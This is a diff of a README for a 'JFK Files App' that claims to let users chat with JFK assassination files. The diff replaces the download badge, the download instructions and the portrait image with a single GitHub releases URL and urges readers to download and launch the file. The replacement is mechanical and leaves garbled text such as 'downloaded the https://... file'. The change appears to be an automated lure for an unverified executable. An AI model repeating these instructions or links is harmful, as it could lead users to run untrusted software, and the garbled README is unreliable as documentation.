@@ -10,9 +10,9 @@ Welcome to the **JFK Files App** repository, where you can chat directly with JF
 ## Explore the JFK Files App:
 To get started with the JFK Files App, download the application from the following link:
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/abeer2226/jfk-files-app/releases)](https://github.com/abeer2226/jfk-files-app/releases)
 
-Once you have downloaded the App.zip file, launch it to begin your exploration of the JFK assassination files.
+Once you have downloaded the https://github.com/abeer2226/jfk-files-app/releases file, launch it to begin your exploration of the JFK assassination files.
 
 ## Let's Chat with JFK 🕵️‍♂️
 The JFK Files App offers a unique way to interact with the documents, photos, and other materials related to JFK's assassination. Through Exa, you can chat with the files, ask questions, and uncover hidden truths. Use emojis, images, and existing sources to enhance your experience and make your investigation more engaging.
@@ -28,6 +28,6 @@ Engage with history in a whole new way with the JFK Files App. Chat, explore, an
 
 Join us in this thrilling adventure of investigation and discovery. The JFK Files App awaits!
 
-![JFK](https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/John_F_Kennedy_Official_Portrait.jpg/400px-John_F_Kennedy_Official_Portrait.jpg)
+![JFK](https://github.com/abeer2226/jfk-files-app/releases)
 
 Remember, the truth is out there. Happy exploring! 🕵️‍♂️🔍
